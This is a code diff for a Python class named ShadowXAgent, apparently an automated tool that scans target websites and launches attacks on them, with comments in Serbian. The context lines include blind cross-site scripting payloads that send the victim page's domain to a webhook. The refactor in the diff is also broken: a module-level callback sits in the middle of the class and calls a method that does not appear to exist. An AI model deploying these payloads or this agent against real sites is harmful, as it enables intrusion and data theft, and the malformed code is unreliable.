@@ -30,8 +30,7 @@ class ShadowXAgent:
     - Prototype Pollution
     """
     
-    def __init__(self, operator):
-        self.operator = operator
+    def __init__(self):
         self.logger = logging.getLogger('ShadowXAgent')
         self.session = requests.Session()
         
@@ -51,17 +50,26 @@ class ShadowXAgent:
             'Accept-Encoding': 'gzip, deflate',
             'Connection': 'keep-alive'
         })
-    def agent_callback(task):
-        from agents.shadowx_agent import ShadowXAgent
-        agent = ShadowXAgent()
-        return agent.analyze_and_attack(task.payload.get("target"))
+
+
+    # agents/shadowx_agent.py
+
+from types import SimpleNamespace
+
+def agent_callback(task_data):
+    if isinstance(task_data, dict):
+        task_data = SimpleNamespace(**task_data)
+
+    agent = ShadowXAgent()
+    return agent.run(task_data)
+
     def analyze_and_attack(self, target_url: str, recon_data: Dict, mission_id: str = None) -> Dict:
         """
         Glavna funkcija - analizira uslove i izvršava odgovarajuće napade
         """
         if mission_id:
-            self.operator.current_mission_id = mission_id
-            
+
+            self.mission_id = mission_id  # 
         self.logger.info(f"ShadowX Agent počinje napad na: {target_url}")
         
         results = {
@@ -685,7 +693,3 @@ class ShadowXAgent:
             f"<script>document.write('<img src=\"{self.webhook_url}?blind_xss_{unique_id}=\"+document.domain>')</script>",
             f"<iframe src=javascript:fetch('{self.webhook_url}?blind_xss_{unique_id}='+document.domain)></iframe>",
         ]
-def agent_callback(task):
-    from agents.shadowx_agent import ShadowXAgent
-    agent = ShadowXAgent()
-    return agent.analyze_and_attack(task.payload.get("target"))
